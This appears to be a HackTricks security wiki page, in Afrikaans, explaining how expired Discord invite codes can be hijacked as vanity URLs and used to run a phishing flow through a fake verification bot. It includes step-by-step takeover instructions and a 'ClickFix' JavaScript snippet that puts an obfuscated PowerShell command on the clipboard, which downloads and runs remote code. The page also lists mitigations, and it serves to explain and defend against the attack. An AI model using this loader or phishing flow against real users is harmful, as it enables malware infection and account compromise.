# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord se uitnodigingstelsel se kwesbaarheid laat bedreigingsakteurs toe om vervalle of verwyderde uitnodigingskodes (tydelik, permanent, of pasgemaakte vaniteit) as nuwe vaniteit skakels op enige vlak 3 geboost bediener te eis. Deur alle kodes na kleinletters te normaliseer, kan aanvallers bekende uitnodigingskodes vooraf registreer en stilweg verkeer oorneem sodra die oorspronklike skakel verval of die bronbediener sy boost verloor.

## Uitnodigingstipes en Oornemingsrisiko

| Uitnodigingstype      | Oornembaar? | Voorwaarde / Kommentaar                                                                                     |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Tydelike Uitnodigingskakel | ✅          | Na vervaldatum word die kode beskikbaar en kan dit weer geregistreer word as 'n vaniteit URL deur 'n geboost bediener. |
| Permanente Uitnodigingskakel | ⚠️          | As verwyder en slegs uit kleinletters en syfers bestaan, kan die kode weer beskikbaar raak.                |
| Pasgemaakte Vaniteitskakel | ✅          | As die oorspronklike bediener sy vlak 3 Boost verloor, word sy vaniteit uitnodiging beskikbaar vir nuwe registrasie. |

## Exploitasiestappe

1. Verkenning
- Monitor openbare bronne (forums, sosiale media, Telegram-kanale) vir uitnodigingskakels wat die patroon `discord.gg/{code}` of `discord.com/invite/{code}` volg.
- Versamel uitnodigingskodes van belang (tydelik of vaniteit).
2. Voorregistrasie
- Skep of gebruik 'n bestaande Discord-bediener met vlak 3 Boost voorregte.
- In **Bedienerinstellings → Vaniteit URL**, probeer om die teikenuitnodigingskode toe te ken. As aanvaar, word die kode gereserveer deur die kwaadwillige bediener.
3. Oornemingsaktivering
- Vir tydelike uitnodigings, wag totdat die oorspronklike uitnodiging verval (of verwyder dit handmatig as jy die bron beheer).
- Vir kodes wat hoofletters bevat, kan die kleinlettervariant onmiddellik geëis word, hoewel omleiding slegs aktief word na vervaldatum.
4. Stilweg Omleiding
- Gebruikers wat die ou skakel besoek, word na die aanvaller-beheerde bediener gestuur sodra die oorneming aktief is.

## Phishing Stroom via Discord Bediener

1. Beperk bedienerkanale sodat slegs 'n **#verify** kanaal sigbaar is.
2. Ontplooi 'n bot (bv. **Safeguard#0786**) om nuwelinge te vra om via OAuth2 te verifieer.
3. Bot lei gebruikers na 'n phishing-webwerf (bv. `captchaguard.me`) onder die voorwendsel van 'n CAPTCHA of verifikasiefase.
4. Implementeer die **ClickFix** UX truuk:
- Vertoon 'n gebroke CAPTCHA boodskap.
- Lei gebruikers om die **Win+R** dialoog te open, plak 'n vooraf gelaaide PowerShell-opdrag, en druk Enter.

### ClickFix Clipboard Injection Voorbeeld
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Hierdie benadering vermy direkte lêeraflaaie en benut bekende UI-elemente om gebruikers se wantroue te verlaag.

## Versagtings

- Gebruik permanente uitnodigingsskakels wat ten minste een hoofletter of nie-alfanumeriese karakter bevat (nooit verval, nie herbruikbaar nie).
- Draai gereeld uitnodigingskodes en herroep ou skakels.
- Monitor Discord-bediener se boost-status en vaniteit-URL-eise.
- Onderwys gebruikers om die egtheid van die bediener te verifieer en om te verhoed dat hulle op die klembord geplakte opdragte uitvoer.

## Verwysings

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
